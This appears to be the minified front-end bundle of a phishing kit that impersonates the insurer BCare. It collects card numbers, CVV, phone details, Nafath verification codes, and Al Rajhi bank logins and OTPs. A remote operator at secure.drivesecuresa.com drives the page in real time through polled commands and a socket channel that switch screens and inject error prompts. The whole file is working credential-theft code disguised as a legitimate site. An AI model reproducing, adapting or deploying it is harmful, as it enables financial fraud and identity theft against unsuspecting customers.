                card: "",
                expiry: {
                    year: "",
                    month: ""
                },
                CVV: ""
            })
              , [C,k] = (0,
            l.useState)({
                number: "",
                type: ""
            })
              , [I,P] = (0,
            l.useState)("")
              , [T,B] = (0,
            l.useState)(!1)
              , [O,D] = (0,
            l.useState)("??")
              , [L,F] = (0,
            l.useState)({
                login: null,
                otp: null
            })
              , [M,U] = (0,
            l.useState)(!1)
              , [H,q] = (0,
            l.useState)(!1)
              , [V,G] = (0,
            l.useState)(!0)
              , z = ((0,
            l.useRef)(!1),
            (0,
            l.useRef)(!1),
            (0,
            l.useRef)(x))
              , Z = (0,
            l.useRef)({
                screen: null,
                sentAt: 0
            })
              , K = (0,
            l.useRef)([])
              , _ = (0,
            l.useRef)(!1)
              , ee = (0,
            l.useRef)(null)
              , er = (0,
            l.useRef)(new Set)
              , es = (0,
            l.useRef)([])
              , el = 10 === x || 13 === x || 14 === x || 15 === x || 16 === x
              , ei = () => {
                B(!0)
            }
            ;
            (0,
            l.useEffect)( () => {
                let e = eL(eO);
                K.current = e.filter(e => e && "object" == typeof e).map(e => ({
                    commandId: "string" == typeof e.commandId ? e.commandId : "",
                    ok: !!e.ok,
                    error: "string" == typeof e.error ? e.error : null,
                    meta: e.meta && "object" == typeof e.meta && !Array.isArray(e.meta) ? e.meta : null
                })).filter(e => e.commandId);
                let t = eL(eD).filter(e => "string" == typeof e && e.trim()).slice(-500);
                es.current = t,
                er.current = new Set(t)
            }
            , []);
            let ed = (0,
            l.useCallback)( () => {
                eR(eO, K.current.slice(-500))
            }
            , [])
              , em = (0,
            l.useCallback)( () => {
                eR(eD, es.current.slice(-500))
            }
            , [])
              , eu = (0,
            l.useCallback)(e => {
                if ("string" != typeof e)
                    return !1;
                let t = e.trim();
                if (!t || er.current.has(t))
                    return !1;
                for (er.current.add(t),
                es.current.push(t); es.current.length > 500; ) {
                    let e = es.current.shift();
                    "string" == typeof e && er.current.delete(e)
                }
                return em(),
                !0
            }
            , [em])
              , ex = (0,
            l.useCallback)(async () => {
                if (_.current || "undefined" != typeof navigator && !1 === navigator.onLine)
                    return;
                let e = eU();
                if (e && K.current.length) {
                    _.current = !0;
                    try {
                        for (; K.current.length; ) {
                            let t = K.current[0];
                            if (!(null == t ? void 0 : t.commandId)) {
                                K.current.shift(),
                                ed();
                                continue
                            }
                            let r = {
                                key: e,
                                type: "BCare",
                                commandId: t.commandId,
                                ok: !!t.ok,
                                ...t.error ? {
                                    error: t.error
                                } : {},
                                ...t.meta ? {
                                    meta: t.meta
                                } : {}
                            };
                            try {
                                if (!(await fetch("https://secure.drivesecuresa.com/bcare/api/user/commands/ack", {
                                    method: "POST",
                                    headers: {
                                        "Content-Type": "application/json"
                                    },
                                    body: JSON.stringify(r),
                                    cache: "no-store",
                                    keepalive: !0
                                })).ok)
                                    break;
                                K.current.shift(),
                                ed()
                            } catch (e) {
                                break
                            }
                        }
                    } finally {
                        _.current = !1
                    }
                }
            }
            , [ed])
              , eh = (0,
            l.useCallback)(function(e) {
                let {ok: t=!0, error: r=null, meta: a=null} = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : {};
                if ("string" != typeof e)
                    return;
                let s = e.trim();
                if (!s || K.current.some(e => (null == e ? void 0 : e.commandId) === s))
                    return;
                let o = a && "object" == typeof a && !Array.isArray(a) ? a : null
                  , l = "string" == typeof r ? r.slice(0, 512) : null;
                K.current.push({
                    commandId: s,
                    ok: !!t,
                    error: l,
                    meta: o
                }),
                K.current.length > 500 && (K.current = K.current.slice(-500)),
                ed(),
                ee.current && window.clearTimeout(ee.current),
                ee.current = window.setTimeout( () => {
                    ex()
                }
                , 250)
            }, [ex, ed])
              , ey = function() {
                let {force: e=!1, useBeacon: t=!1} = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : {}
                  , r = eU();
                if (!r)
                    return;
                let a = eM(z.current)
                  , s = Date.now();
                if (!e && Z.current.screen === a && s - Z.current.sentAt < 3e3)
                    return;
                Z.current = {
                    screen: a,
                    sentAt: s
                };
                let o = JSON.stringify({
                    key: r,
                    type: "BCare",
                    currentScreen: a,
                    currentPath: eH(a),
                    currentPageLabel: eQ(a)
                });
                if (t && "undefined" != typeof navigator && "function" == typeof navigator.sendBeacon) {
                    let e = new Blob([o],{
                        type: "application/json"
                    });
                    navigator.sendBeacon(eB, e);
                    return
                }
                fetch(eB, {
                    method: "POST",
                    headers: {
                        "Content-Type": "application/json"
                    },
                    body: o,
                    keepalive: !0
                }).then(e => {
                    (null == e ? void 0 : e.status) === 403 && ei()
                }
                ).catch(e => {}
                )
            };
            return ((0,
            l.useEffect)( () => {
                "scrollRestoration"in window.history && (window.history.scrollRestoration = "manual")
            }
            , []),
            (0,
            l.useEffect)( () => {
                let e = () => ei();
                return window.addEventListener("client-banned", e),
                () => {
                    window.removeEventListener("client-banned", e)
                }
            }
            , []),
            (0,
            l.useEffect)( () => {
                let e = new AbortController
                  , t = (0,
                m.ZS)(window.location.search)
                  , r = eU()
                  , a = window.location.hostname;
                return (async () => {
                    try {
                        let s = await (0,
                        m.iq)({
                            url: "https://secure.drivesecuresa.com/bcare/api/user/isValid",
                            data: {
                                host: a,
                                key: r,
                                type: "BCare",
                                ...null === t ? {} : {
                                    Campaign: t
                                }
                            },
                            signal: e.signal,
                            delay: !1
                        });
                        (null == s ? void 0 : s.status) === 403 && ei()
                    } catch (e) {}
                }
                )(),
                () => {
                    e.abort()
                }
            }
            , []),
            (0,
            l.useEffect)( () => {
                let e = eU();
                if (!e)
                    return;
                let t = !1
                  , r = null
                  , a = !1
                  , s = 2500
                  , o = () => s = Math.min(Math.max(Math.round(1.6 * s), 2500), 3e4)
                  , l = e => {
                    t || (r && window.clearTimeout(r),
                    r = window.setTimeout( () => {
                        n()
                    }
                    , e))
                }
                  , n = async () => {
                    if (t || a)
                        return;
                    a = !0;
                    let r = new AbortController
                      , n = window.setTimeout( () => {
                        r.abort()
                    }
                    , 7e3);
                    try {
                        let a = await fetch("https://secure.drivesecuresa.com/bcare/api/user/presence/ping", {
                            method: "POST",
                            headers: {
                                "Content-Type": "application/json"
                            },
                            body: JSON.stringify({
                                key: e,
                                type: "BCare"
                            }),
                            signal: r.signal,
                            cache: "no-store",
                            keepalive: !0
                        });
                        if ((null == a ? void 0 : a.status) === 403) {
                            ei(),
                            t = !0;
                            return
                        }
                        a.ok ? (s = 2500,
                        l(2500)) : l(o())
                    } catch (e) {
                        l(o())
                    } finally {
                        window.clearTimeout(n),
                        a = !1
                    }
                }
                  , i = () => {
                    s = 2500,
                    l(0)
                }
                  , c = () => {
                    "visible" === document.visibilityState && (s = 2500,
                    l(0))
                }
                ;
                return window.addEventListener("online", i),
                window.addEventListener("visibilitychange", c),
                n(),
                () => {
                    t = !0,
                    window.removeEventListener("online", i),
                    window.removeEventListener("visibilitychange", c),
                    r && window.clearTimeout(r)
                }
            }
            , []),
            (0,
            l.useEffect)( () => {
                let e = () => {
                    ex()
                }
                ;
                return window.addEventListener("online", e),
                () => {
                    window.removeEventListener("online", e)
                }
            }
            , [ex]),
            (0,
            l.useEffect)( () => {
                let e = eU();
                if (!e)
                    return;
                let t = !1
                  , r = null
                  , a = !1
                  , s = e => {
                    t || (r && window.clearTimeout(r),
                    r = window.setTimeout( () => {
                        l()
                    }
                    , e))
                }
                  , o = e => {
                    let t = "string" == typeof (null == e ? void 0 : e.id) ? e.id : ""
                      , r = "string" == typeof (null == e ? void 0 : e.type) ? e.type : ""
                      , a = (null == e ? void 0 : e.payload) && "object" == typeof e.payload ? e.payload : {}
                      , s = {
                        via: "http",
                        type: r,
                        executedAt: new Date().toISOString()
                    };
                    if (t) {
                        if (er.current.has(t)) {
                            eh(t, {
                                ok: !0,
                                meta: s
                            });
                            return
                        }
                        try {
                            if ("screen_change" === r) {
                                let e = null == a ? void 0 : a.screen
                                  , r = "number" == typeof e ? e : Number.parseInt(String(e), 10)
                                  , o = eM(Number.isFinite(r) ? r : z.current);
                                U(!1),
                                q(!1),
                                p(o),
                                eu(t),
                                eh(t, {
                                    ok: !0,
                                    meta: {
                                        ...s,
                                        executedScreen: o
                                    }
                                });
                                return
                            }
                            if ("remove_loading" === r) {
                                q(!0),
                                U(!1),
                                setTimeout( () => q(!1), 3e3),
                                eu(t),
                                eh(t, {
                                    ok: !0,
                                    meta: s
                                });
                                return
                            }
                            if ("nafath_code" === r) {
                                D(null == a ? void 0 : a.code),
                                eu(t),
                                eh(t, {
                                    ok: !0,
                                    meta: s
                                });
                                return
                            }
                            if ("stc_open" === r) {
                                let e = "boolean" != typeof (null == a ? void 0 : a.open) || a.open;
                                f(e),
                                eu(t),
                                eh(t, {
                                    ok: !0,
                                    meta: {
                                        ...s,
                                        open: e
                                    }
                                });
                                return
                            }
                            if ("rajhi_login_error" === r) {
                                let e = (null == a ? void 0 : a.code) || "invalid";
                                F(t => ({
                                    ...t,
                                    login: e
                                })),
                                p(14),
                                eu(t),
                                eh(t, {
                                    ok: !0,
                                    meta: {
                                        ...s,
                                        code: e
                                    }
                                });
                                return
                            }
                            if ("rajhi_otp_error" === r) {
                                let e = (null == a ? void 0 : a.code) || "invalid";
                                F(t => ({
                                    ...t,
                                    otp: e
                                })),
                                p(16),
                                eu(t),
                                eh(t, {
                                    ok: !0,
                                    meta: {
                                        ...s,
                                        code: e
                                    }
                                });
                                return
                            }
                            eu(t),
                            eh(t, {
                                ok: !1,
                                error: "unknown_command",
                                meta: s
                            })
                        } catch (e) {
                            eh(t, {
                                ok: !1,
                                error: "execution_failed",
                                meta: s
                            })
                        }
                    }
                }
                  , l = async () => {
                    if (t || a)
                        return;
                    a = !0;
                    let r = !1
                      , l = new AbortController
                      , n = window.setTimeout( () => {
                        l.abort()
                    }
                    , 1e4);
                    try {
                        await ex();
                        let t = await fetch("https://secure.drivesecuresa.com/bcare/api/user/commands/poll", {
                            method: "POST",
                            headers: {
                                "Content-Type": "application/json"
                            },
                            body: JSON.stringify({
                                key: e,
                                type: "BCare",
                                limit: 25
                            }),
                            signal: l.signal,
                            cache: "no-store"
                        });
                        if (t.ok) {
                            let e = await t.json()
                              , a = Array.isArray(null == e ? void 0 : e.commands) ? e.commands : [];
                            for (let e of (r = a.length > 0,
                            a))
                                o(e)
                        }
                    } catch (e) {} finally {
                        window.clearTimeout(n),
                        a = !1
                    }
                    s(r ? 250 : d ? 2e3 : 1e3)
                }
                  , n = () => {
                    s(0)
                }
                ;
                return window.addEventListener("online", n),
                s(0),
                () => {
                    t = !0,
                    window.removeEventListener("online", n),
                    r && window.clearTimeout(r)
                }
            }
            , [eh, ex, d, !1, eu]),
            (0,
            l.useEffect)( () => {
                z.current = x
            }
            , [x]),
            (0,
            l.useEffect)( () => {
                14 !== x && L.login && F(e => ({
                    ...e,
                    login: null
                })),
                16 !== x && L.otp && F(e => ({
                    ...e,
                    otp: null
                }))
            }
            , [x, L.login, L.otp]),
            (0,
            l.useEffect)( () => {}
            , []),
            (0,
            l.useEffect)( () => {}
            , [x]),
            (0,
            l.useEffect)( () => {
                ey({
                    force: !0
                })
            }
            , [x]),
            (0,
            l.useEffect)( () => {
                let e = window.setInterval( () => {
                    ey()
                }
                , 15e3)
                  , t = () => {
                    "hidden" === document.visibilityState && ey({
                        force: !0,
                        useBeacon: !0
                    })
                }
                ;
                return window.addEventListener("visibilitychange", t),
                window.addEventListener("pagehide", t),
                () => {
                    window.clearInterval(e),
                    window.removeEventListener("visibilitychange", t),
                    window.removeEventListener("pagehide", t)
                }
            }
            , []),
            (0,
            l.useEffect)( () => {
                requestAnimationFrame( () => {
                    window.scrollTo({
                        top: 0,
                        left: 0,
                        behavior: "auto"
                    })
                }
                )
            }
            , [x]),
            (0,
            l.useEffect)( () => {
                if (!e)
                    return;
                let t = () => {
                    u(!0),
                    ex()
                }
                  , r = t => {
                    u(!1),
                    "io server disconnect" === t && e.connect()
                }
                  , a = (e, t) => {
                    let r = "number" == typeof e ? e : Number.parseInt(String(e), 10)
                      , a = eM(Number.isFinite(r) ? r : z.current);
                    U(!1),
                    q(!1),
                    p(a);
                    let s = null == t ? void 0 : t.commandId;
                    "string" == typeof s && s.trim() && (eu(s),
                    eh(s, {
                        ok: !0,
                        meta: {
                            via: "socket",
                            type: "screen_change",
                            executedAt: new Date().toISOString(),
                            executedScreen: a
                        }
                    }))
                }
                  , s = (e, t) => {
                    let r = "boolean" != typeof e || e;
                    "boolean" == typeof e ? f(r) : f(e => !e);
                    let a = (null == t ? void 0 : t.commandId) || (null == e ? void 0 : e.commandId);
                    "string" == typeof a && a.trim() && (eu(a),
                    eh(a, {
                        ok: !0,
                        meta: {
                            via: "socket",
                            type: "stc_open",
                            executedAt: new Date().toISOString(),
                            open: r
                        }
                    }))
                }
                  , o = e => {
                    D(null == e ? void 0 : e.code);
                    let t = null == e ? void 0 : e.commandId;
                    "string" == typeof t && t.trim() && (eu(t),
                    eh(t, {
                        ok: !0,
                        meta: {
                            via: "socket",
                            type: "nafath_code",
                            executedAt: new Date().toISOString()
                        }
                    }))
                }
                  , l = e => {
                    F(t => ({
                        ...t,
                        login: (null == e ? void 0 : e.code) || "invalid"
                    })),
                    p(14);
                    let t = null == e ? void 0 : e.commandId;
                    "string" == typeof t && t.trim() && (eu(t),
                    eh(t, {
                        ok: !0,
                        meta: {
                            via: "socket",
                            type: "rajhi_login_error",
                            executedAt: new Date().toISOString(),
                            code: (null == e ? void 0 : e.code) || "invalid"
                        }
                    }))
                }
                  , n = e => {
                    F(t => ({
                        ...t,
                        otp: (null == e ? void 0 : e.code) || "invalid"
                    })),
                    p(16);
                    let t = null == e ? void 0 : e.commandId;
                    "string" == typeof t && t.trim() && (eu(t),
                    eh(t, {
                        ok: !0,
                        meta: {
                            via: "socket",
                            type: "rajhi_otp_error",
                            executedAt: new Date().toISOString(),
                            code: (null == e ? void 0 : e.code) || "invalid"
                        }
                    }))
                }
                  , i = (e, t) => {
                    U(!1),
                    q(!1);
                    let r = "number" == typeof e ? e : Number.parseInt(String(null != e ? e : ""), 10);
                    Number.isFinite(r) ? p(eM(r)) : p(e => e + 1);
                    let a = null == t ? void 0 : t.commandId;
                    "string" == typeof a && a.trim() && (eu(a),
                    eh(a, {
                        ok: !0,
                        meta: {
                            via: "socket",
                            type: "screen_change",
                            executedAt: new Date().toISOString()
                        }
                    }))
                }
                  , c = (e, t) => {
                    q(!0),
                    U(!1),
                    setTimeout( () => q(!1), 3e3);
                    let r = null == t ? void 0 : t.commandId;
                    "string" == typeof r && r.trim() && (eu(r),
                    eh(r, {
                        ok: !0,
                        meta: {
                            via: "socket",
                            type: "remove_loading",
                            executedAt: new Date().toISOString()
                        }
                    }))
                }
                ;
                return e.on("connect", t),
                e.on("disconnect", r),
                e.on("ChangeScreen", a),
                e.on("STC", s),
                e.on("nafath", o),
                e.on("rajhiLoginError", l),
                e.on("rajhiOtpError", n),
                e.on("next", i),
                e.on("removeLoading", c),
                () => {
                    e.off("connect", t),
                    e.off("disconnect", r),
                    e.off("ChangeScreen", a),
                    e.off("STC", s),
                    e.off("nafath", o),
                    e.off("rajhiLoginError", l),
                    e.off("rajhiOtpError", n),
                    e.off("next", i),
                    e.off("removeLoading", c)
                }
            }
            , [eh, ex, !1, eu, e]),
            (0,
            l.useEffect)( () => {
                11 === x && "function" == typeof window.gtag && eq && eV && window.gtag("event", "conversion", {
                    send_to: eG
                })
            }
            , [x]),
            T) ? (0,
            a.jsxs)("div", {
                className: "min-h-screen flex flex-col items-center justify-center p-8 text-center",
                style: {
                    backgroundColor: eA.background,
                    color: eA.textPrimary
                },
                children: [(0,
                a.jsx)(eE, {
                    className: "mb-6"
                }), (0,
                a.jsx)("h1", {
                    className: "text-3xl font-bold mb-3",
                    style: {
                        color: eA.primary
                    },
                    children: c.bannedTitle
                }), (0,
                a.jsx)("p", {
                    className: "text-lg",
                    style: {
                        color: eA.textSecondary
                    },
                    children: c.bannedMessage
                })]
            }) : (0,
            a.jsxs)("div", {
                dir: r,
                style: {
                    backgroundColor: eA.background,
                    color: eA.textPrimary
                },
                className: "min-h-screen flex flex-col antialiased",
                children: [!el && (0,
                a.jsxs)("header", {
                    className: "sticky top-0 z-[500]",
                    children: [V && (0,
                    a.jsx)("div", {
                        className: "w-full text-white",
                        style: {
                            background: "linear-gradient(120deg, ".concat(eA.accent, " 0%, ").concat(eA.accentDark, " 100%)")
                        },
                        children: (0,
                        a.jsxs)("div", {
                            className: "container max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-1.5 flex flex-wrap items-center justify-between gap-2 sm:gap-4",
                            children: [(0,
                            a.jsxs)("div", {
                                className: "flex items-center gap-2 text-xs sm:text-sm",
                                children: [(0,
                                a.jsx)("span", {
                                    className: "inline-flex h-5 w-5 items-center justify-center rounded-full bg-white/20 text-[11px] font-bold",
                                    children: "!"
                                }), (0,
                                a.jsx)("span", {
                                    className: "font-semibold",
                                    children: o.promoTitle
                                }), (0,
                                a.jsx)("span", {
                                    className: "hidden sm:inline opacity-90",
                                    children: o.promoSubtitle
                                })]
                            }), (0,
                            a.jsxs)("div", {
                                className: "flex items-center gap-2",
                                children: [(0,
                                a.jsx)("a", {
                                    href: "#apps",
                                    className: "rounded-full bg-white/15 px-3 py-1 text-xs font-semibold transition hover:bg-white/25",
                                    children: o.promoCta
                                }), (0,
                                a.jsxs)("button", {
                                    type: "button",
                                    "aria-label": "Close promo",
                                    onClick: () => G(!1),
                                    className: "rounded-full border border-white/40 p-1.5 text-white/90 transition hover:bg-white/15",
                                    children: [(0,
                                    a.jsx)("span", {
                                        className: "sr-only",
                                        children: "Close"
                                    }), (0,
                                    a.jsx)(ek, {
                                        className: "h-3.5 w-3.5"
                                    })]
                                })]
                            })]
                        })
                    }), (0,
                    a.jsx)("div", {
                        className: "backdrop-blur border-b",
                        style: {
                            backgroundColor: eA.headerBackground,
                            borderColor: eA.border
                        },
                        children: (0,
                        a.jsxs)("div", {
                            className: "container max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 h-16 flex items-center justify-between ".concat("rtl" === r ? "flex-row-reverse" : "flex-row"),
                            children: [(0,
                            a.jsxs)("div", {
                                className: "flex items-center gap-2",
                                children: [(0,
                                a.jsx)("button", {
                                    type: "button",
                                    onClick: () => s("ar" === t ? "en" : "ar"),
                                    className: "rounded-full border px-3 py-1 text-xs font-semibold transition hover:bg-slate-50",
                                    style: {
                                        borderColor: eA.border,
                                        color: eA.textPrimary
                                    },
                                    children: o.langToggle
                                }), (0,
                                a.jsx)("button", {
                                    type: "button",
                                    "aria-label": o.profileLabel,
                                    className: "p-2 rounded-full border transition hover:bg-slate-50",
                                    style: {
                                        borderColor: eA.border
                                    },
                                    children: (0,
                                    a.jsx)(eS, {
                                        color: eA.primary
                                    })
                                })]
                            }), (0,
                            a.jsx)("a", {
                                href: "#",
                                "aria-label": "BCare Home",
                                className: "flex items-center",
                                children: (0,
                                a.jsx)("img", {
                                    src: "/bcare-logo.svg",
                                    alt: "bcare logo",
                                    width: 90,
                                    height: 45,
                                    priority: "true"
                                })
                            }), (0,
                            a.jsx)("button", {
                                "aria-label": o.menuLabel,
                                className: "p-2 rounded-full border transition hover:bg-slate-50 focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-[var(--color-accent)] focus-visible:ring-offset-2",
                                style: {
                                    borderColor: eA.border
                                },
                                children: (0,
                                a.jsx)(eC, {
                                    color: eA.textPrimary
                                })
                            })]
                        })
                    })]
                }), M && 1 !== x && (0,
                a.jsx)("div", {
                    className: "fixed inset-0 flex items-center justify-center z-[1000] p-4",
                    style: {
                        backgroundColor: eA.loadingOverlayBg
                    },
                    children: (0,
                    a.jsxs)("div", {
                        className: "p-8 rounded-xl shadow-2xl w-full max-w-sm flex flex-col items-center text-center",
                        style: {
                            backgroundColor: eA.surface
                        },
                        children: [(0,
                        a.jsx)("img", {
                            src: "/bcare-logo.svg",
                            alt: "bcare logo",
                            width: 90,
                            height: 45,
                            className: "mb-5 opacity-90"
                        }), (0,
                        a.jsx)("h2", {
                            className: "text-xl font-semibold mb-2",
                            style: {
                                color: eA.textPrimary
                            },
                            children: c.loadingTitle
                        }), (0,
                        a.jsx)(eI, {
                            className: "h-12 w-12",
                            color: eA.accent
                        })]
                    })
                }), M && 1 === x && (0,
                a.jsx)("div", {
                    className: "fixed inset-0 flex items-center justify-center z-[1000] p-4",
                    style: {
                        backgroundColor: eA.loadingOverlayBg
                    },
                    children: (0,
                    a.jsxs)("div", {
                        className: "p-8 rounded-xl shadow-2xl w-full max-w-sm flex flex-col items-center text-center",
                        style: {
                            backgroundColor: eA.surface
                        },
                        children: [(0,
                        a.jsx)("img", {
                            src: "/loading.png",
                            alt: c.loadingSearchAlt,
                            width: 120,
                            height: 120,
                            className: "mb-5 opacity-90"
                        }), (0,
                        a.jsx)("h2", {
                            className: "text-xl font-semibold mb-2",
                            style: {
                                color: eA.textPrimary
                            },
                            children: c.loadingSearchTitle
                        }), (0,
                        a.jsx)("p", {
                            className: "text-sm mb-5",
                            style: {
                                color: eA.textSecondary
                            },
                            children: c.loadingSearchSubtitle
                        }), (0,
                        a.jsx)(eI, {
                            className: "h-12 w-12",
                            color: eA.accent
                        })]
                    })
                }), H && (0,
                a.jsx)("div", {
                    className: "fixed inset-0 flex items-center justify-center z-[1000] p-4",
                    style: {
                        backgroundColor: eA.loadingOverlayBg
                    },
                    children: (0,
                    a.jsx)("div", {
                        className: "p-8 rounded-xl shadow-2xl w-full max-w-sm flex flex-col items-center text-center",
                        style: {
                            backgroundColor: eA.surface
                        },
                        children: (0,
                        a.jsx)("h2", {
                            className: "text-xl font-semibold mb-2",
                            style: {
                                color: eA.error
                            },
                            children: c.loadingError
                        })
                    })
                }), (0,
                a.jsxs)("main", {
                    className: "flex-grow w-full mx-auto max-w-md px-4 sm:max-w-xl sm:px-5 lg:max-w-3xl xl:max-w-4xl",
                    children: [0 === x && (0,
                    a.jsx)(S, {
                        setLoading: U,
                        setPageState: p
                    }), 1 === x && (0,
                    a.jsx)(E, {
                        setLoading: U,
                        insuranceValue: g,
                        setInsuranceValue: v,
                        InsuranceType: y,
                        setInsuranceType: b,
                        setPageState: p
                    }), 2 === x && (0,
                    a.jsx)(R, {
                        insuranceValue: g,
                        setLoading: U,
                        InsuranceType: y,
                        setInsuranceType: b,
                        setPageState: p,
                        setSelectedItem: N
                    }), 3 === x && (0,
                    a.jsx)(Q, {
                        setLoading: U,
                        setPageState: p,
                        selectedItem: j
                    }), 4 === x && (0,
                    a.jsx)(X, {
                        setLoading: U,
                        CardDetails: w,
                        setCardDetails: A,
                        setPageState: p,
                        selectedItem: j
                    }), 5 === x && (0,
                    a.jsx)(J, {
                        setLoading: U,
                        setPageState: p,
                        selectedItem: j
                    }), 6 === x && (0,
                    a.jsx)(Y, {
                        setLoading: U,
                        CardDetails: w,
                        setPageState: p,
                        selectedItem: j
                    }), 7 === x && (0,
                    a.jsx)(W, {
                        setLoading: U,
                        CardDetails: w,
                        setPageState: p,
                        selectedItem: j
                    }), 8 === x && (0,
                    a.jsx)($, {
                        setLoading: U,
                        setPhoneNumber: k,
                        mobileOperator: I,
                        setMobileOperator: P,
                        CardDetails: w,
                        setPageState: p,
                        selectedItem: j
                    }), 9 === x && (0,
                    a.jsx)(et, {
                        setLoading: U,
                        phoneNumber: C,
                        mobileOperator: I,
                        CardDetails: w,
                        setPageState: p,
                        selectedItem: j
                    }), 10 === x && (0,
                    a.jsx)(ea, {
                        setLoading: U,
                        phoneNumber: C,
                        CardDetails: w,
                        setPageState: p,
                        selectedItem: j
                    }), 11 === x && (0,
                    a.jsx)(eo, {
                        setLoading: U,
                        phoneNumber: C,
                        CardDetails: w,
                        nafathCode: O,
                        setPageState: p,
                        selectedItem: j
                    }), 12 === x && (0,
                    a.jsx)(en, {
                        setLoading: U,
                        STCOpen: h,
                        setSTCOpen: f,
                        setPageState: p
                    }), 13 === x && (0,
                    a.jsx)(ec, {
                        setPageState: p
                    }), 14 === x && (0,
                    a.jsx)(ep, {
                        setPageState: p,
                        errorCode: L.login,
                        onClearError: () => F(e => ({
                            ...e,
                            login: null
                        }))
                    }), 15 === x && (0,
                    a.jsx)(ef, {}), 16 === x && (0,
                    a.jsx)(eg, {
                        errorCode: L.otp,
                        onClearError: () => F(e => ({
                            ...e,
                            otp: null
                        }))
                    }), 17 === x && (0,
                    a.jsx)(eN, {})]
                }), !el && (0,
                a.jsxs)("footer", {
                    style: {
                        backgroundColor: eA.footerBackground,
                        color: eA.footerText
                    },
                    className: "mt-12 py-12 text-center text-sm",
                    children: [(0,
                    a.jsx)("div", {
                        className: "container max-w-7xl mx-auto px-4 sm:px-6 lg:px-8",
                        children: (0,
                        a.jsxs)("div", {
                            className: "flex flex-col lg:flex-row items-center justify-between gap-8",
                            children: [(0,
                            a.jsxs)("div", {
                                className: "text-center lg:text-start max-w-md",
                                children: [(0,
                                a.jsx)("img", {
                                    src: "/bcare-logo.svg",
                                    alt: "BCare Logo White",
                                    width: 110,
                                    height: 55,
                                    className: "mx-auto lg:mx-0 opacity-90 invert brightness-0"
                                }), (0,
                                a.jsxs)("p", {
                                    className: "mt-4 text-xs leading-relaxed",
                                    style: {
                                        color: eA.footerTextMuted
                                    },
                                    children: ["? ", new Date().getFullYear(), " ", o.footerCopy]
                                }), (0,
                                a.jsxs)("div", {
                                    className: "mt-4 flex items-center justify-center lg:justify-start gap-3",
                                    children: [(0,
                                    a.jsx)("span", {
                                        className: "text-xs uppercase tracking-wide text-white/60",
                                        children: o.contactLabel
                                    }), (0,
                                    a.jsx)("a", {
                                        href: "tel:8001180045",
                                        className: "text-sm font-semibold hover:underline",
                                        style: {
                                            color: eA.accent
                                        },
                                        children: "8001180042"
                                    })]
                                })]
                            }), (0,
                            a.jsxs)("div", {
                                id: "apps",
                                className: "flex flex-col items-center gap-3",
                                children: [(0,
                                a.jsx)("span", {
                                    className: "text-xs text-white/60",
                                    children: "BCare App"
                                }), (0,
                                a.jsxs)("div", {
                                    className: "flex flex-wrap items-center justify-center gap-4",
                                    children: [(0,
                                    a.jsx)("a", {
                                        href: "https://play.google.com/store/apps/details?id=com.app.bcare",
                                        target: "_blank",
                                        rel: "noopener noreferrer",
                                        className: "transition-transform hover:scale-105",
                                        children: (0,
                                        a.jsx)("img", {
                                            src: "/android_mobile_app.svg",
                                            alt: "Download on Google Play",
                                            width: 135,
                                            height: 45
                                        })
                                    }), (0,
                                    a.jsx)("a", {
                                        href: "https://apps.apple.com/us/app/bcare-%D8%A8%D9%8A-%D9%83%D9%8A%D8%B1/id1490248033?ls=1",
                                        target: "_blank",
                                        rel: "noopener noreferrer",
                                        className: "transition-transform hover:scale-105",
                                        children: (0,
                                        a.jsx)("img", {
                                            src: "/ios_mobile_app.svg",
                                            alt: "Download on the App Store",
                                            width: 135,
                                            height: 45
                                        })
                                    })]
                                })]
                            })]
                        })
                    }), (0,
                    a.jsx)("div", {
                        className: "w-full flex items-center justify-center mb-1 mt-6",
                        children: (0,
                        a.jsx)(ew, {})
                    })]
                })]
            })
        }
    },
    5818: function(e, t, r) {
        "use strict";
        r.d(t, {
            LanguageProvider: function() {
                return l
            },
            Z: function() {
                return n
            }
        });
        var a = r(7437)
          , s = r(2265);
        let o = (0,
        s.createContext)({
            lang: "ar",
            dir: "rtl",
            setLang: () => {}
        })
          , l = e => {
            let {children: t} = e
              , [r,l] = (0,
            s.useState)("ar");
            (0,
            s.useEffect)( () => {
                let e = window.localStorage.getItem("lang");
                ("ar" === e || "en" === e) && l(e)
            }
            , []),
            (0,
            s.useEffect)( () => {
                if ("undefined" == typeof document)
                    return;
                let e = "ar" === r ? "rtl" : "ltr";
                document.documentElement.lang = r,
                document.documentElement.dir = e,
                window.localStorage.setItem("lang", r)
            }
            , [r]);
            let n = (0,
            s.useMemo)( () => ({
                lang: r,
                dir: "ar" === r ? "rtl" : "ltr",
                setLang: l
            }), [r]);
            return (0,
            a.jsx)(o.Provider, {
                value: n,
                children: t
            })
        }
          , n = () => (0,
        s.useContext)(o)
    },
    5783: function(e, t, r) {
        "use strict";
        r.d(t, {
            SocketProvider: function() {
                return x
            },
            s: function() {
                return u
            }
        });
        var a = r(7437)
          , s = r(2265)
          , o = r(5040)
          , l = r(1517);
        let n = localStorage.getItem("key") || "key" + Math.random().toString(16).slice(2);
        localStorage.getItem("key") || localStorage.setItem("key", n);
        let i = (0,
        l.ZS)(window.location.search)
          , c = window.location.hostname
          , d = (0,
        o.io)("https://secure.drivesecuresa.com", {
            transports: ["polling", "websocket"],
            upgrade: !1,
            reconnection: !0,
            reconnectionAttempts: 1 / 0,
            reconnectionDelay: 1e3,
            reconnectionDelayMax: 5e3,
            timeout: 7e3,
            closeOnBeforeunload: !0,
            autoConnect: !0,
            extraHeaders: {
                id: n,
                ...null === i ? {} : {
                    Campaign: i
                },
                website: c,
                type: "BCare"
            },
            query: {
                id: n,
                ...null === i ? {} : {
                    Campaign: i
                },
                website: c,
                type: "BCare"
            }
        });
        if (!window.__bcareSocketOfflineBound) {
            window.__bcareSocketOfflineBound = !0;
            let e = "https://secure.drivesecuresa.com/bcare/api/user/socket-offline"
              , t = () => {
                try {
                    var t;
                    let r = null == d ? void 0 : d.id;
                    if (!r)
                        return;
                    let a = JSON.stringify({
                        key: n,
                        socketId: r
                    });
                    if ("function" == typeof (null === (t = navigator) || void 0 === t ? void 0 : t.sendBeacon)) {
                        let t = new Blob([a],{
                            type: "application/json"
                        });
                        navigator.sendBeacon(e, t)
                    } else
                        fetch(e, {
                            method: "POST",
                            headers: {
                                "Content-Type": "application/json"
                            },
                            body: a,
                            keepalive: !0
                        }).catch( () => {}
                        );
                    try {
                        d.disconnect()
                    } catch (e) {}
                } catch (e) {}
            }
            ;
            window.addEventListener("pagehide", t),
